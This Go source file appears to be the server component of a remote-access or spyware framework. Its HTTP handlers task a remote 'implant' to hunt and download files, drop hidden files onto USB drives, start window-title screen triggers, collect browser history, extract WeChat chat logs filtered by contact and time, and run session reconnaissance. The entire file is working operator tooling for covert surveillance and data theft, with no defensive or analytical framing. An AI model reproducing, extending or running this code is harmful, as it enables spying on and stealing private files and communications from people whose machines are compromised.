package server

import (
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
)

type fileHuntRequest struct {
	Path     string `json:"path" form:"path"`
	Pattern  string `json:"pattern" form:"pattern"`
	Command  string `json:"command" form:"command"`
	Download bool   `json:"download" form:"download"`
	MaxFiles int    `json:"max_files" form:"max_files"`
	MaxBytes int    `json:"max_bytes" form:"max_bytes"`
	MaxDepth int    `json:"max_depth" form:"max_depth"`
}

type usbDropRequest struct {
	Path    string `json:"path" form:"path"`
	Dest    string `json:"dest" form:"dest"`
	Command string `json:"command" form:"command"`
	Hide    bool   `json:"hide" form:"hide"`
}

type screenTriggerRequest struct {
	Match    string `json:"match" form:"match"`
	Command  string `json:"command" form:"command"`
	Interval int    `json:"interval" form:"interval"`
}

func bindJSONOrForm(c *gin.Context, dst any) {
	_ = c.ShouldBind(dst)
}

func (s *Server) handleFileHunt(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	var req fileHuntRequest
	bindJSONOrForm(c, &req)
	if req.Path == "" {
		req.Path = c.PostForm("path")
	}
	pattern := req.Pattern
	if pattern == "" {
		pattern = req.Command
	}
	if pattern == "" {
		pattern = c.PostForm("pattern")
	}
	if !req.Download {
		d := strings.ToLower(c.PostForm("download"))
		req.Download = d == "1" || d == "true" || d == "yes"
	}
	var parts []string
	if req.Download {
		parts = append(parts, "download=1")
	}
	if req.MaxFiles > 0 {
		parts = append(parts, "max_files="+strconv.Itoa(req.MaxFiles))
	}
	if req.MaxBytes > 0 {
		parts = append(parts, "max_bytes="+strconv.Itoa(req.MaxBytes))
	}
	if req.MaxDepth > 0 {
		parts = append(parts, "max_depth="+strconv.Itoa(req.MaxDepth))
	}
	data := strings.Join(parts, ",")
	task := s.issueAgentTask(c, id, TaskSpec{Type: "file_hunt", Command: pattern, Path: req.Path, Data: data})
	if task == nil {
		return
	}
	slog.Info("File hunt requested", "agent_id", id, "path", req.Path, "pattern", pattern, "download", req.Download)
	s.dispatchTask(c, task, "file_hunt", req.Path+" "+pattern)
}

func (s *Server) handleScreenTriggerStart(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	var req screenTriggerRequest
	bindJSONOrForm(c, &req)
	match := strings.TrimSpace(req.Match)
	if match == "" {
		match = strings.TrimSpace(req.Command)
	}
	if match == "" {
		match = strings.TrimSpace(c.PostForm("match"))
	}
	if match == "" {
		match = strings.TrimSpace(c.PostForm("command"))
	}
	if match == "" {
		respondError(c, http.StatusBadRequest, "window title match is required")
		return
	}
	if req.Interval <= 0 {
		if v := strings.TrimSpace(c.PostForm("interval")); v != "" {
			req.Interval, _ = strconv.Atoi(v)
		}
	}
	if req.Interval > 0 {
		match = fmt.Sprintf("%s,%d", match, req.Interval)
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "screen_trigger_start", Command: match})
	if task == nil {
		return
	}
	s.dispatchTask(c, task, "screen_trigger_start", match)
}

func (s *Server) handleScreenTriggerStop(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"screen_trigger_stop", "screen_trigger_stop", "stop screen trigger"})
}

func (s *Server) handleUSBEnum(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"usb_enum", "usb_enum", "USB / volume enum"})
}

func (s *Server) handleUSBDrop(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	var req usbDropRequest
	bindJSONOrForm(c, &req)
	src := strings.TrimSpace(req.Path)
	if src == "" {
		src = strings.TrimSpace(c.PostForm("path"))
	}
	if src == "" {
		respondError(c, http.StatusBadRequest, "usb_drop requires an explicit source path")
		return
	}
	dest := strings.TrimSpace(req.Dest)
	if dest == "" {
		dest = strings.TrimSpace(req.Command)
	}
	if dest == "" {
		dest = strings.TrimSpace(c.PostForm("dest"))
	}
	if dest == "" {
		dest = strings.TrimSpace(c.PostForm("command"))
	}
	data := ""
	if req.Hide {
		data = "hide=1"
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "usb_drop", Command: dest, Path: src, Data: data})
	if task == nil {
		return
	}
	s.LogAuditRecord(c, "usb_drop", "agent", id, "USB drop "+src+" -> "+dest, true, nil)
	s.dispatchTask(c, task, "usb_drop", src+" -> "+dest)
}

func (s *Server) handleBrowserHistory(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	var req struct {
		Browser string `json:"browser" form:"browser"`
		Command string `json:"command" form:"command"`
	}
	bindJSONOrForm(c, &req)
	browser := strings.TrimSpace(req.Browser)
	if browser == "" {
		browser = strings.TrimSpace(req.Command)
	}
	if browser == "" {
		browser = strings.TrimSpace(c.PostForm("browser"))
	}
	if browser == "" {
		browser = "all"
	}
	task := s.issueAgentTask(c, id, TaskSpec{Type: "browser_history", Command: browser})
	if task == nil {
		return
	}
	s.dispatchTask(c, task, "browser_history", "Browser history: "+browser)
}

// wechatHistoryRequest represents the request parameters for wechat_history task
type wechatHistoryRequest struct {
	Filter    string `json:"filter" form:"filter"`         // 可选：all / 关键词
	Contact   string `json:"contact" form:"contact"`       // 可选：联系人名称/wxid/备注
	StartTime string `json:"start_time" form:"start_time"` // 可选：开始时间 RFC3339
	EndTime   string `json:"end_time" form:"end_time"`     // 可选：结束时间 RFC3339
}

// handleWeChatHistory dispatches a wechat_history task to the agent
func (s *Server) handleWeChatHistory(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	id := c.Param("id")
	var req wechatHistoryRequest
	bindJSONOrForm(c, &req)

	filter := strings.TrimSpace(req.Filter)
	if filter == "" {
		filter = strings.TrimSpace(req.Contact)
	}
	if filter == "" {
		filter = "all"
	}

	// Build filter JSON for the implant. Marshal instead of string formatting
	// so contact keywords containing quotes/backslashes stay valid JSON.
	filterPayload, err := json.Marshal(wechatHistoryRequest{
		Filter:    filter,
		Contact:   req.Contact,
		StartTime: req.StartTime,
		EndTime:   req.EndTime,
	})
	if err != nil {
		respondError(c, http.StatusInternalServerError, "failed to encode wechat filter")
		return
	}

	task := s.issueAgentTask(c, id, TaskSpec{Type: "wechat_history", Command: string(filterPayload)})
	if task == nil {
		return
	}
	s.dispatchTask(c, task, "wechat_history", "WeChat history: "+filter)
}

func (s *Server) handleSessionRecon(c *gin.Context) {
	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"session_recon", "session_recon", "session recon"})
}
